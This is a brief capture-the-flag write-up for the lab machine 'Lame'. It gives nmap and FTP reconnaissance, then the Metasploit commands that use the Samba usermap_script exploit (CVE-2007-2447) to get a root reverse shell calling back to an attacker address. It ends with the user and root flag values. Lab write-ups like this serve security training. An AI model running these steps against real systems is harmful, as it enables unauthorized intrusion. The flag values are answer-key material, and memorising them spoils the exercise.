# Lame - Easy

```shell
nmap -T4 -p- -A -Pn 10.10.10.3

ftp 10.10.10.3

msfconsole -q

use exploit/multi/samba/usermap_script

show options

set RHOSTS 10.10.10.3

set RPORT 445

set LHOST 10.10.14.3

show options

run

#reverse shell
whoami
#root
```

```markdown
Open ports & services:

  * 21 - ftp - vsftpd 2.3.4
  * 22 - ssh - OpenSSH 4.7p1
  * 139 - netbios-ssn - Samba smbd 3.X - 4.X
  * 445 - netbios-ssn - Samba smbd 3.0.20 (Debian)
  * 3632 - distccd - distccd

We can login into ftp as anonymous, but there are no files.

Now, Googling for 'Samba 3.0.20' gives us exploits based on 'Username map script', CVE-2007-2447; we can use this with Metasploit.

Using msfconsole, we get reverse shell as root.

User flag can be found in /home/makis and root flag can be found in /root.
```

1. Submit user flag - 09f98474d849a66f7e7621ed8fc31d09

2. Submit root flag - dfcd0b4cf64e8bb227694d0691ac8092
